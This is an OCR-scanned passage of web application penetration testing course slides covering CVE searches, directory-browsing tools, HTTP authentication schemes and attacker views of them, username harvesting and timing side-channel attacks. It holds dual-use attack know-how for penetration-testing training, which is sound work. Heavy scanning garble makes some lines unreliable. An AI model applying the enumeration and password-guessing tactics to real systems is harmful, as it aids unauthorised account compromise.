2, l, 2,2. and 2.3; and Centralview Subscription rreud Prevention 2,0 and 2,1 auow 
remote, attackers to obtalr'l se,nsitive irtformatic11 v1a unspecified vectors, d diffe,r~nt 
vuinerabi!ity than CVE"-2015~5407 and CVE-1015·540S. 
r,,;f.J.D1 S---22JN' DlGuard 4.5 allov,,s remote attai:k\:!:rs to cbtsin the in:s.ta!ldticn path via the c parameter 
to index.php. 
QlE:2D) 4-'9111 The UDF fftesvsrem impiementahcn in tt--e Limsc kernel before 3.18.2: does- nm ensure 
thtit spa.;:e is available tor storing a symlink target's: narne a!onq v&h a trailing \0- 
character, whkh allows local users to obtain sens-ttve information via a crafted 
fitesvstem image, related to fs/udf/symlink.c and fs/udf/unkod.~.c. 
MITRE's Common Vulnerabilities and Exposures (CVE) website (http://cve.mitre.org/index.html) includes a 
powerful search function available at http://cve.mitre.org/find/index.html (https://cyber.gd/542 _315). 
The following searches may prove useful for discovering information leakage flaws, as well as related flaws 
such as directory traversal: 
Search for CVEs referencing "directory": 
http://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=directory 
Search for CVEs referencing "directory and Joomla": 
http://cve.mitre.org/ cgi-bin/ cvekey .cgi ?keyword=directory+ J oom la 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
75 
'-" 
'-" 
Automated Discovery of Directory Browsing 
Many tools automatically 
discover directory browsing 
flaws: 
• Including Nikto, wgaf, and 
ZAP's forced browse 
functionality 
• Metasploit's WMAP and 
msfcrawler auxiliary module 
The following tools include 
useful wordlists of common 
user/ server directories that may 
be used by other tools: 
• SecLists 
• DIRE 
• DirBuster 
• FuzzDB 
• JBroFuzz 
•WMAP 
SEC54t I Web App Penetration Testing and Ethical Hacking 
16 
\__, 
'-" 
'-" 
'-" 
'-.../ 
'-" 
'-.../ 
'-" 
'-" 
'-' 
'-" 
'-" 
'-" 
'-" 
'-' 
'-.../ 
'-.../ 
The Security542 VM contains many useful directory wordlists that may be used by virtually any fuzzing tool; 
here are the local paths: 
Sec Lists: 
• 
/opt/dirb/seclists/ 
DIRB: 
• 
/opt/dirb/wordlists/ 
DirBuster: 
• 
/opt/dirbuster 
FuzzDB: 
• 
/opt/fuzzdb/Discovery/ 
JBroFuzz: 
• 
/opt/jbrofuzz/fuzzers/ 
WMAP: 
• 
/opt/metasploit-framework/data/wmap 
76 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-.../ 
'-' 
'-" 
'-" 
'-.../ 
'-.../ 
'-.../ 
'-.../ 
'-'' 
'-.../ 
'---' 
'-.../ 
'---' 
'-.../ 
'-.../ 
'-" 
'-' 
'----' 
'-.../ 
'-.../ 
.'----' 
'-.../ 
Course Roadmap 
• Day 1: Introduction and Information 
Gathering 
• Day 2: Configuration, Identity, and 
Authorization Testing 
• Day 3: Injection 
• Day 4: XXE and XSS 
• Day 5: CSRF, Logic Flaws, and 
Advanced Tools 
• Day 6: Capture the Flag 
CONFIGURATION, IDENTITY, AND 
AUTHORIZATION TESTING 
I. Scanning with Nmap 
2. Exercise: Gathering Server Information 
3. Testing Software Configuration 
4. Shellshock 
Exercise:· Shellshock 
6. Spidering Web Applications 
7. Exercise: Web Spidering 
8. Analyzing Spidering 
9. Exercise: ZAP Forced 
Ht Fuzzing 
I I • Information Leakage 
12. Exercise: Directory Browsing 
13. Authentication 
14. Exercise; A1.1n, . .,,n1nc:n·1,,n 
15. Usernarne Harvesting 
16. Exercise: Username Harvesting 
17. Burp Intruder 
18. Exercise: fuzzing 
19. Summary 
SEC542. j Web App Penetration Testing and Ethical Hacking 
Intruder 
Course Roadmap 
Let's perform a directory browsing exercise, and also gain experience using ZAP's fuzzer. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
77 
'-" 
'-" 
SEC::542 Workbook: Directory Browsing 
~ 
Exercise 2.5: Directory Browsing 
SEC542 I WebApp PenetranonIesttng and Ethical Hacking 
1e 
..._,; 
'---" 
'-../ 
'-../ 
'---" 
'---" 
'---" 
'----" 
'-../ 
'-../ 
'-../ 
'-../ 
'-" 
'-" 
'-../ 
SEC542 Workbook: Directory Browsing 
'-../ 
'-" 
Please go to Exercise 2.5 in the 542 Workbook. 
'-" 
___, 
'-../ 
'-" 
'-../ 
'-../ 
'-../ 
..__, 
'-" 
'-../ 
'-../ 
'-" 
'-../ 
'---" 
-._/ 
'-../ 
78 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
___, 
'---" 
Course Roadmap 
CONFIGURATION, IDENTITY, AND 
AUTHORIZATION TESTING 
• Day 1: Introduction and Information 
Gathering 
• Day 2: Configuration, Identity, and 
Authorization Testing 
• Day 3: Injection 
• Day 4: XXE and XSS 
• Day 5: CSRF, Logic Flaws, and 
Advanced Tools 
• Day 6: Capture the Flag 
I. Scanning with Nmap 
2. Exercise: Gathering Server Information 
3. Testing Software Configuration 
4. Shellshock 
S. Ex.erdse: Shellshock 
6. Spidering Web Applications 
7. Exercise: Web Spidering 
8. Analyz,ing Spidering Results 
9. Exercise: ZAP Forced Browse 
IO. Fuzzing 
11. Information Leakage 
12. Exercise: Directory Browsing 
13. Authentication 
14. Exercise: Authentication 
15. Username Harvesting 
16. Exercise: Username Harvesting 
17. Burp intruder 
I It Ex,~rc, .. e: Fuzzing with Burp lntri.M:ler 
19. Summary 
'-''.:.,:::,:,,· 
,.,:;,,·:: 
-=·,-c 
SECS42 j Web App Penetration Testing and Ethical Ha<:king 
Course Roadmap 
We will discuss authentication next. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
79 
\...., 
Authentication 
• Authentication identifies the user to the application 
• Typically, a username/password combination 
o Although client-side certificates are available 
• Authentication schemes in common use today on the web: 
o Basic 
o Digest 
o Integrated Windows 
o Forms-based 
o Federated Identity Management (OAuth, OpenID, and SAML) 
• Other more complex schemes exist, but often use these schemes for transportation of 
authentication information 
o Biometrics, token, custom client application residing on client, custom mobile code pushed to 
browser, etc. 
SEC542 I Web App Penetration Testing and Ethical Hacking 
so 
\...., 
'-' 
'-" 
,...,
'-"
'-'
'-' 
'-' 
'-" 
'-' 
'-"
'-' 
'-'
'-'
'-'
.__..., 
Client authentication is how an application verifies the identity of a user. Most secure application interfaces 
begin with authentication so that they can provide the level of access that corresponds to the end user's privilege. 
There are a number of authentication schemes in use on the web today. We are going to explore them over the 
next few slides. We discuss what these authentication methods mean to an attacker. 
80 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-'
'-' 
'-"
'-" 
'-' 
'-" 
'---' 
'----' 
\....; 
'-' 
'-' 
'-' 
\...., 
'-' 
'- 
'- 
'- 
'- 
\..... 
\..... 
'- 
'- 
HTTP Basic Authentication 
• RFC 2617 defines modern Basic 
Authentication 
o Originally defined in RFC 1945 
• U sername and password 
transmitted 
• Server uses a "Realm" to 
identify itself to the user 
o Realm is able to be set to anything 
by the administrator 
• Encoded in Baseoa 
o Takes each three-byte chunk and converts it 
to four printable ASCII characters using 
character set of 10 numbers, 26 lowercase, 26 
uppercase, +, and / 
0 10 + 26 + 26 + 2 = 64 
o Pads to 3 bytes using = sign 
o Not encrypted, a~ very simple obfuscation 
o Numerous free tools, widgets, and websites 
encode and reverse Baseoa 
• The web server handles the verification 
o Apache uses .htaccess 
o IIS uses local accounts 
Basic Authentication was one of the first forms of authentication for the web. It was defined in RFC 2617 and 
has a number of problems. First and foremost, the usemame and password are transmitted over the network 
using a simple Base64 encoding, which is trivial to reverse. For the lazy, or smart (you decide), many tools and 
sites reverse the encoding with the click of a button. We explore some of these over the next few days. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
81 
'-" 
'--' 
HTTP Basic Authentication·· Illustrated 
© 
Client Request: 
GET /adminpage/index.html HTTP/1.l 
Server Response: 
HTTP/1.1 401 Authorization Required 
WWW-Authenticate: Basic realm=sans.org 
Browser 
Web Server 
@ 
Client Request: 
GET /adminpage/index.html HTTP/1.1 
Authorization: Basic a2pvaG5zb246RGVuaxNIIUJyZW5uYSFTYXJhaCE- 
'-" 
'-" 
'-.../ 
'-" 
'--' 
'-' 
'--' 
'-.../ 
'-" 
'-" 
'-' 
'-" 
'--' 
'-.../ 
'-" 
This graphic outlines the HTTP "basic" authentication process. 
I . Client requests a page. 
2. The server sends back a 401 status code, which indicates that the client needs to authenticate. 
3. The client sends the request again for the page but this time includes the authentication information input 
by the user. The username and password are encoded using Base64 (not encrypted). 
82 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-.../ 
'--' 
'-.....,, 
'-' 
'-" 
'-" 
.__,, 
'--' 
'--' 
'--' 
'-" 
.,._,, 
'--' 
'-.../ 
,._,, 
'-.../ 
..__... 
'-'
.__,, 
.__,, 
'--" 
'--' 
'---' 
'--' 
.__,,, 
Attacker's Perspective of HTTP Basic Authentication 
• Basic Authentication has no concept of: 
oAccount lockout 
o Maximum number of login attempts 
• Plain text authentication, easily sniff able if not passed via HTTPS 
• Can easily be replayed 
• Impersonating the website to dupe browsers into providing 
authentication credentials 
• No logout functionality without closing the browser 
83 
One of the reasons that attackers like basic authentication is that it is trivial to decode the usemame and 
password after packets have been captured. Many of the tools we use in class have the capabilities to decode this 
encoded data. 
If attackers cannot sniff the traffic, brute force attacks are facilitated because the system has no provision for 
account lockout. The attacker can send an unlimited number ofrequests. The only factors that may prevent this 
are controls outside of the Basic Authentications system such as web app firewalls or log monitoring, which 
would detect the attack. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
83 
'--' 
'--' 
H'TTP [)igest Au.thentication 
• Designed to "fix" Basic 
Authentication 
• Similar to Basic 
Authentication, except: 
o Uses MD5 to send password 
hashes 
o Has a nonce to use as a salt 
• Defined in RFC 2069 
• RFC 2069 was replaced by 
2617 
o Added security enhancements: 
• Quality of Protection (qop) flag 
o The qop flag tells the client how to 
generate the response hash 
• Client Nonce (cnonce) 
o Provides a unique value to fold into hash 
algorithm so that hashed password isn't 
always the same value 
'--' 
'----' 
'----' 
'----' 
'----' 
'----' 
'----' 
'----' 
'----' 
'----' 
'----' 
'----' 
'----' 
'----' 
Digest mode authentication is an update to Basic mode. It was an effort to solve the problem of unencrypted 
authentication data being transmitted over the network. In Digest mode authentication, the server sends a nonce 
to the client. This nonce is used as a salt when the client MOS-hashes the password and sends it back with the 
usemame. This makes it harder for the attacker to capture the password. However, because the nonce is sent in 
clear text, an attacker can capture the string and crack it using various publicly available tools. 
Digest was originally outlined in RFC 2069. Digest security was updated in RFC 2617 where features such as 
the quality of the protection flag and the client nonce were added. In RFC2617 the response generation was 
outlined as described here. This system is used when qop is set to auth or left blank. 
First, the client generates hash 1 (HA 1) by doing an md5 hash of usemame:realm:password. 
Second, the client generates hash2 (HA2) by running an md5 hash ofmethod:URI. 
Finally, the client generates the response hash by running an md5 hash of 
HAI :nonce:nonceCount:clientNonce:qop:HA2. 
84 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'--' 
"--' 
'----' 
'-./ 
'----' 
'--' 
'-' 
'-./ 
'-./ 
'-' 
'----' 
'----' 
'----' 
'----' 
'----'
'----' 
'----'
'--'
'-' 
'-' 
'----'
'-...,; 
'-'
'----'
'-' 
'----
HTTP Digest Authentication Illustrated 
0 
Client Request: 
GET 
/adminpage/index.html HTTP/1.1 
Browser 
0 
Server Response: 
HTTP/1.1 401 Authorization Required 
WWW-Authenticate: Digest realm=sans.org 
nonce="BgkyFRFdekhyD346xszcd" 
opaque="000000000" 
stale=false algorithm=MDS qop="auth" 
Web Server 
Client Request: 
GET 
/adminpage/index.html HTTP/1.1 
SEC542 f Web App Penetration Testing and Ethical Hacking 
8S 
This graphic outlines the HTTP "digest" authentication process. 
I. Client requests a page. 
2. The server sends back a 401 status code, which indicates that the client needs to authenticate. 
3. The client sends a request again for the page but this time includes the authentication information based 
on input by the user. 
The big difference between "basic" and "digest" authentication is that with digest authentication, the password is 
never sent over the wire. 
Note: The "opaque" value is a string of data, specified by the server, which should be returned by the client 
unchanged. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
85 
'-" 
'---' 
Attacker's Perspective of HTTP .Digest Authentication 
• Digest has no concept of: 
o Account lockout 
o Maximum number of login 
attempts 
• Nonce predictability can be a 
problem 
o This is rare for most modern web 
servers 
• No logout functionality unless 
browser is closed 
• Man-in-the-middle attacks, in 
which an attacker: 
o Pretends to be a website 
o Sends request to the real site and 
retrieves the nonce 
o Requests authentication from 
client, using the nonce from the 
real site 
o Passes authentication response to 
the real site, gaining access 
SEC542 ! Web App Penerratlon'lestlng and Ethical Hacking 
86 
.._..., 
\..J 
\..J 
'----' 
'----' 
'----' 
'----' 
'----' 
'-' 
'----' 
'----' 
'----' 
'----' 
'----' 
'----' 
'----' 
For attackers, "digest" authentication is not as desirable as "basic" authentication because in digest 
authentication credentials cannot be decoded. However, attackers still like digest authentication because it 
presents two key vulnerabilities. First, the digest method still does not include a mechanism for account lockout, 
and second, it is vulnerable to man-in-the-middle attacks. 
The page describing the Apache mod_ auth _ digest module describes the issue nicely: 
Digest authentication was intended to be more secure than basic authentication, but no longer fulfills 
that design goal. A man-in-the-middle attacker can trivially force the browser to downgrade to basic 
authentication. And even a passive eavesdropper can brute-force the password using today's graphics 
hardware, because the hashing algorithm used by digest authentication is too fast. Another problem is 
that the storage of the passwords on the server is insecure. The contents of a stolen htdigest file can be 
used directly for digest authentication. Therefore using mod _ssl to encrypt the whole connection is 
strongly recommended. 1 
Reference: 
[l] http://httpd.apache.org/docs/2.2/mod/mod _ auth _ digest.html (https://cyber.gd/542 _ 139) QR 
86 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-' 
'-' 
'----' 
'-' 
\..J 
'-' 
'----' 
'----' 
'----' 
'----' 
'-' 
\..J 
'-' 
'----' 
'---' 
'----' 
'-' 
'-...., 
'----' 
'----' 
Integrated Windows Authentication 
Microsoft proprietary authentication 
• IE, Firefox, and other browsers support client portion 
Uses Windows OS authentication 
• Challenge- Response protocol 
• NTLM or Kerberos passed across HTTP or HTTPS 
o Kerberos is supported as of IIS s 
Typically seen in intranets 
• Windows Integrated Authentication requires the client and the server to be 
in the same or trusted Windows Active Directory domains 
There are Apache modules, but they are not widely supported 
37 
Integrated Windows Authentication (IW A) is specific to Microsoft Windows operating systems and Microsoft's 
Internet Information Services (11S). It leverages authentication that the client operating system has already 
performed. When the browser requests a resource, that authentication is passed through to the server, which then 
grants access to the resource. 
This method of authentication is typically seen on intranets. 
The IW A process is quite simple: 
1. The user authenticates to the client machine by logging on. 
2. The operating system verifies this authentication with the domain controllers. 
3. The user browses to a website. 
4. The server requests authentication. 
5. The client then passes the original authentication token to the server. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
87 
Attacker's Perspective of HTTP Integrated Windows Authentication 
• Focus on the client machines 
• Always logged on 
• This authentication is perfect for Cross-Site Request Forgery 
(CSRF) 
• XSS is also more useful here 
o But not to steal cookies 
o XSS can automate the CSRF attacks 
SEC542 j Web App Penetration Testing and Ethical Hacking 
oo 
'-..../ 
'--' 
'--'
.._, 
'--' 
.._, 
'--'
'--' 
'--'
'--' 
.._, 
\....., 
'---' 
\....., 
As with the certificate-based authentication, attackers focus on the weak link, which is the client machine. If 
attackers can take control of the client machine or force it to make a request on their behalf, attackers can access 
the web server using the user's credentials. This type of authentication is perfect for conducting Cross-Site 
Request Forgery attacks, as we study later. 
88 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'--' 
'-' 
'--' 
'----'
\....., 
.._, 
'---' 
'---' 
'---' 
'---' 
'---' 
\....., 
'---' 
\....., 
'- 
'- 
'- 
'- 
'- 
'---- 
'- 
Forms-Based Authentication 
• Most common in modern sites 
• Uses HTML forms, integrated with 
normal web pages of application 
o Very user-friendly 
• Initial authentication near 
beginning of session 
o For subsequent requests, some sort of 
session credential must be established 
• Unless HTIPS is used, credentials 
are transported plain text 
• Backend authentication is limited 
only by the developer's imagination 
o Typically uses a database or LDAP 
• Client-side code can also be part of 
the process 
Sign in 
Email Address 
a00nt@sec542.org 
89 
Forms-based authentication is increasingly common on modem sites. This occurs when the developer has chosen 
to use the application to handle authentication instead of relying on the server as the previous methods did. 
Forms are user-friendly, as they can be designed to look like the application, instead of using the client's display 
widgets. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
89 
'-' 
'-..,/ 
Pieces of Forms-Based Authentication 
Forms-based logins are made of multiple pieces 
• Form 
o May be on a separate page or part of regular pages 
• Processing code 
o Processing code can be either client-side or server-side code 
o Code can be part of the same page or a separate page on the server 
• Resources that require authentication 
o Commonly ignored by developers 
o Testers should attempt to access the resources directly 
f Web App Penetration Testing and Ethical Hacking 
to 
v 
'-' 
'-' 
'-' 
'-' 
v 
'-' 
'-../ 
'---' 
'-' 
'-../ 
'-'
'-J
'-'
'---' 
'-' 
'-'
Three pieces make up a forms-based authentication system: 
'----'
..__,, 
• 
Login form: This is the web form that accepts the usemame and password. 
• 
Processing page: This page processes the authentication attempt. It may be part of the same page or a 
separate page entirely. 
• 
Resource: Authentication serves no purpose ifthere isn't a resource that requires it before allowing 
access. 
Forms-based authentication follows the process listed here: 
1. A client requests a page. 
2. The server responds with a page that includes a form (HTML, Flash, Java applet, or other form type). 
3. The user fills out the form. 
4. The browser submits the page to the application, including the information from the user. 
5. This response is processed by the application. 
6. Either an error page or the resource requested is returned to the client. 
90 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'---" 
'-'
'---'
'---'
'-'
'-....- 
'-'
'-....-
'-....-
'--- 
----- 
\......
'---
'---
...__ 
...__
...__
...__
'--
'--
'- 
Forms-Based Authentication Illustrated 
How all the pieces fit together 
These items may be 
part of the same 
page or two 
different pages 
User receives 
form © 
Browser 
17:\ Processing code 
\;!I validates username 
and password 
SEC542 I WebApp P~tration Testing an~EthicalBacking 
fl 
As is shown in this diagram, users are presented with an HTML form. They fill in the items requested, typically 
the usemame and password. This form is then submitted to the processing code, which can be a part of the same 
or separate page. The processing code then connects to the backend data source and validates the authentication 
information. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
91 
'---' 
\...,
Attacker's Perspective of Forms-Based Authentication 
• Only as secure as the developer 
makes it 
o Or the underlying development 
environment, provided that the 
developer doesn't break or inadvertently 
circumvent its security measures 
• Account lockout typically doesn't 
exist 
• Check for injection vulnerabilities 
o SQL injection 
o XSS to redirect users 
• Capturing the 
authentication token 
o Session 
oCookie 
oOthers ... 
• Spoofing the site is 
possible 
o Phishing attacks are an 
example of this 
SEC542 I Web App Penetration Testing and Ethical Hacking 
92 
\....., 
'---'
'---'
.'---"
'---' 
'---" 
'---' 
'---' 
\.J
...__.,, 
'---' 
\.J
'---' 
'---' 
'---'
\.J
'-.../ 
Attackers are excited to discover sites that rely on forms-based authentication because the developer is 
responsible for implementing security. As a result, the security of sites that rely on forms-based authentication is 
inconsistent, and often vulnerabilities can be found. 
Most injection attacks can be used against vulnerable forms-based authentication, and if the authentication token 
can be captured, the attacker has access to the site. 
92 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
...__.,, 
'---'
'---" 
'-.../ 
'---' 
'---' 
.___,, 
'---' 
'---' 
'---' 
'---' 
'-...,, 
'-...,, 
'-...,, 
'-...,, 
'---' 
'-- 
'-- 
'-- 
'-- 
'-- 
Course Roadmap 
CONFIGURATION, IDENTITY, AND 
AUTHORIZATION TESTING 
• Day 1: Introduction and Information 
Gathering 
• Day 2: Configuration, Identity, and 
Authorization Testing 
• Day 3: Injection 
• Day 4: XXE and XSS 
• Day 5: CSRF, Logic Flaws, and 
Advanced Tools 
• Day 6: Capture the Flag 
I. Scanning with Nmap 
2. Exercise: Gathering Server Information 
3, Testing Software Configuration 
4. Shellshodc 
S. Exercise: She!lshock 
6. Spidering Web Applications 
7. Exercise: Web Spidering 
8. Analyzing Spidering 
9. i=,,,.,,.,.,"'"'' ZAP Forced Browse 
I 0. Fuzzing 
11. Information leakage 
Exercise: Directory Browsing 
13. Authentication 
14. Exercise: Authentication 
15. Usemame M2rv"'"''"""<! 
16. Exercise: Username Harvesting 
17. Burp Intruder 
Exercise: Fm:::z1ng with Burp lntrncler 
19. Summary 
SEC542 l Web App Penetration Testing and Ethical Hacking 
93 
Course Roadmap 
Next up: A hands-on authentication exercise. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
93 
'----' 
SEC542 Workbook:Authentication 
Ill 
Exercise 2.6: Authentication 
SEC542 I WebApp Penetration Testing and Ethical Hacking 
'----' 
'-J
'-J 
'-J 
'-J
·-.__,
'----' 
'-"
'----'
'----'
'-J 
'----'
'----'
'-" 
'----'
'-...,
'-"
SEC542 Workbook: Authentication 
'-J
'----'
Please go to Exercise 2.6 in the 542 Workbook. 
'-J
'-" 
'----'
'----'
'----'
'-J 
'----' 
'----' 
'-' 
'--- 
'--- 
'--- 
'--- 
'--- 
'--- 
'--- 
'--- 
94 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
"-- 
'--- 
Course Roadmap 
CONFIGURATION, IDENTITY, AND 
AUTHORIZATION TESTING 
• Day 1: Introduction and Information 
Gathering 
• Day 2: Configuration, Identity, and 
Authorization Testing 
• Day 3: Injection 
• Day 4: XXE and XSS 
• Day 5: CSRF, Logic Flaws, and 
Advanced Tools 
• Day 6: Capture the Flag 
I. Scanning with Nmap 
2. Ext,rcii-.e: Gathe,rin,., Server Information 
3. Testing Software Configuration 
4.Shellshock 
S. Exercise: Shellshock 
6. Spidering Web Applications 
Exercise: Web Spidering 
8. Analyzing Spidering Results 
9. Exercise: ZAP forced Browse 
10. fuzzing 
11 • Information leai<age 
12. Exercise: Directory Browsing 
13. Authentication 
14. Exercise: Authentkation 
IS. Username Harvesting 
16. Exercise: Username Harvesting 
17. Burp Intruder 
18. Exercise: Fuzzing with Burp Intruder 
19 •. Summary 
SEC542 I Web App Penetration Tosting and Ethical Hacking 
95 
Course Roadmap 
We will next discuss harvesting usemames, one-half of the information required to launch a password guessing 
attack. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
95 
'--" 
O'TG-ltl.ENT--004: Testing for Acco.unt Enumeratio.n 
"The scope of this test is to verify if it is possible to 
collect a set of valid usernames by interacting with 
the authentication 
.. mechanism of the application. 
This test will be usefulfor brute-force testinq.in 
which the tester verifies if, given a valid username, 
it is possible to find the corresponding password." 1 
'-.../ 
'-.../ 
'-' 
'-.../ 
'-.../ 
'-.,/ 
'-' 
'-.../ 
'-.../ 
'-.../ 
'-.../ 
'-.../ 
'-" 
'-' 
The purpose of Test ID OTG-IDENT-004 is to assess whether legitimate user accounts can be discerned through 
interaction with the web application. 
Reference: 
[1] 
https://www.owasp.org/index.php/Testing_for _ Account_ Enumeration_ and_ Guessable_ User_ Account_(OTG- 
IDENT-004) (https://cyber.gd/542 _ 157) QR 
96 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-.../ 
'-.../ 
'-.../ 
'-.../ 
'-' 
'-' 
'-.....- 
'-.../
'-.../ 
'---' 
'---' 
;,,._-- 
'---' 
'-.../ 
'-'
'-'
'-.../
'-.../
'-' 
'-'
\....,, 
'-'
'-' 
'---'
'---' 
Username Harvesting 
• Password guessing attacks require two data sources: Potential 
usernames and potential passwords 
o Blindly fuzzing both may eventually work but is quite inefficient 
o Developing a list of known-good users will considerably speed up the 
attack 
• Enter username harvesting: Launched as a separate exercise 
before conducting a password guessing attack 
• Public records research can offer a bonanza of potential 
usernames: 
o The company website, email, Google, Linkedln, Facebook, Twitter, and 
more 
It may seem obvious, but it's worth noting that a password guessing attack requires two basic data sources: 
Usemames and passwords. There are countless bots on the Internet that blindly guess both all day long: You 
know this if you run an Internet-accessible SSH daemon on TCP port 22 (and also check your logs). 
This is fine for bots that have time and bandwidth to bum but is not ideal for penetration testers: We must be 
more efficient. 
Given unlimited time (and scope), penetration tests rarely fail. We always work under scope and time 
limitations, however, and moving faster means generating more and better results. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
97 
'-' 
Harvesting Usernames from Authentication. Pages 
• Website authentication pages can also be quite helpful 
• These pages usually lend themselves to fuzzing attacks 
o Web servers are usually high performance 
o Account lockout is not common for web applications 
o Web servers are often poorly monitored 
• Look for differences in these cases: 
o Good username/bad password 
o Bad username/bad password 
SECS42 IWebAppPenetrationTesting and Ethical Hacking 
98 
'-'
'--'
'-'
'-' 
'--'
'----'
___,, 
'-'
'--'
'-'
'-'
'-'
'-'
'--'
'--' 
'---- 
We will look for differences in two basic use cases: Good username/bad password and bad usemame/bad 
password, and we may generate large volumes ofrequests (and logs) while doing so. 
Most web applications are designed to be high performance. Account lockout exists for large/public web 
applications such as Google Mail but is unusual for the types of web applications used by most web application 
penetration testing clients. 
The "set it and forget it" mentality that pervades Fortune 5,000 organizations (and beyond) is a boon for web 
application penetration testers. Web application logs are rarely checked, or they are shoveled into a compliance 
SIEM that is choking on millions of events per day. 
As a result, highly aggressive password guessing attacks typically work quite well and go unnoticed for days or 
even weeks. The only exception: When the web server or web application grows large enough to fill the disk 
and potentially crash the server. 
This is more common on internal servers since public servers have usually mitigated this risk; this is because the 
bots got there first, the server crashed, and lessons learned were applied. The usual solution in that case: More 
disk, logging to a dedicated logging partition that will not crash the system when it fills, or less logging. The 
course authors have seen logging disabled entirely for this reason. 
98 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-' 
'--'
'-' 
'-' 
'-'
'-'
'-' 
'-' 
'-'
'-'
'---- 
'---- 
'---- 
'- 
'- 
'- 
'- 
'- 
'- 
'--- 
'- 
'--- 
'- 
Results to Look For 
• Different HTML responses: 
o "Incorrect Username " - bad username 
o "Incorrect Password " - bad password 
• Different response variables: 
o example.com/logon.php?reason=o - bad username 
o example.com/logon.php?reason=1- bad password 
• Forms that repeat a good username on refresh, while a bad username is blank 
• There are sometimes subtle differences in the returned HTML 
o Tools like Burp Comparer can discover these 
• Response timing differences 
o Discussed next 
SEC542 j Web:APP Penetration Testing andJd1icar Hacking 
9' 
There are a number of ways to determine good username/bad password and bad username/bad password, from 
obvious to quite subtle. 
The most obvious: The website tells you "bad username" when the username is incorrect, and "bad password" 
when the username is correct but the password is not. 
This is considered bad security design but is sometimes intentionally configured as an overt attempt to lower the 
total cost of ownership (TCO) of user support by limiting help desk calls. Yes, some users forget their own 
username, and an error message telling them their username is incorrect lowers the chance they will pick up the 
phone and call the help desk. 
Remember to check password reset forms as well: These often overtly reveal good usernames when the 
authentication page follows best practices, for the same TCO-lowering reasons. 
Other indicators include different variable values returned with the error page, or a form that reflects a good 
username on the next login screen but blanks a bad one. 
Some are subtler but can be discerned via tools like Burp's Comparer. 
Finally, side-channel attacks such as timing attacks can be quite useful and are often overlooked. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
99 
...__,, 
...__,, 
Side-Channel Attacks 
A side-channel attack uses physical attributes to break a system: 
• Electromagnetic Interference (EMI), heat, sound, time, and such 
For example, monitoring CPU utilization ( or simply measuring CPU 
heat) can indicate CPU load during encryption 
• This can be used to break the encryption 
Bruce Schneier on side-channel attacks: 
• Some researchers have claimed that this is cheating. True, but in real-world 
systems, attackers cheat. Their job is to recover the key, not to follow some 
rules of conduct. Prudent engineers of secure systems anticipate this and 
adapt to it. It is our belief that most operational cryptanalysis makes use of 
side-channel information.' 
SEC542 J Web AppPenetrationTesting and. Ethical Hacking 
100 
...__,, 
'-' 
...__,, 
'-' 
'--' 
'--'
...__,, 
'-J
'-J
'-' 
'-' 
'-' 
'-' 
'-' 
'--'
A side-channel attack uses physical information, such as EMI, heat, and sound, to break a system. These are 
especially applicable to crypto attacks. 
This attack vector was discovered in the 1940s due to Electro Magnetic Interference (EMI), and led to 
TEMPEST shielding: 
During the Second World War, the U.S. Signal Corps encrypted high-level teletype communications 
with one-time tapes (OTT:,). This system uses Vernam 's original principle where a five-bit teletype 
signal is mixed with a key tape, containing random five-bit values. The system is quite simple but 
absolutely unbreakable, even with todays or any future technology. A famous example is the 
Washington-Moscow hotline ... 
In 1943, Bell engineers discovered little spikes on the screen of an oscilloscope near a working one- 
time tape mixer. Upon further investigation, they discovered that the oscilloscope had picked up 
electrical signals, emitted by the one-time tape mixer. To their surprise, the spikes on the screen 
represented the readable unencrypted five-bit signal. They could read the plain text directly from their 
oscilloscopel? 
References: 
[l] https://www.schneier.com/crypto-gram/archives/1998/06 l 5.html (https://cyber.gd/414_3 l 8) 
[2] http://users.telenet.be/d.rijmenants/en/tempest.htm (https:/ /cyber.gd/542 _324) 
100 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'--'
'-' 
'-'
'-' 
'-' 
'-' 
'-' 
'-' 
'-' 
'-' 
'-' 
'-' 
'-' 
'-' 
'-' 
'-' 
....__, 
....__, 
'-- 
'--- 
'-- 
'-- 
Practical Side-Channel Attacks 
• Side-channel attacks sound a bit theoretical, so let's focus on a 
real-world example: Timing attacks 
• Here is a *seemingly* well-designed login form: 
o Same error for good username/bad password, and bad username/bad 
password 
o Response page is identical in both cases, with no discernable difference 
• In this case: What if the developer returns an immediate error for 
a bad username, but hashes the (bad) password for a good 
username before returning the error? 
o Solid logic: Why bother hashing the password if the username is bad? 
o This is our opportunity 
7;;;.:::::.';;;,,~-:;•;;:;.:;cE~.'.'.+[f,+"";";~;:;1~I:,.::::+c'C2~·'·'i;,;;: 
IOI 
Side-channel attacks sound theoretical: How does this apply to web application penetration testers? 
A web developer has followed best practices: The error pages for good usemame/bad password and bad 
usemame/bad password are identical. None of the previously described tricks will work. 
The web developer is also efficient and only hashes the password if the username is valid. The logic is solid: 
Why hash the password for a bad usemame? There is no point because the login has already failed. 
In this case, a side-channel timing attack may divulge good usernames. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
101 
'--' 
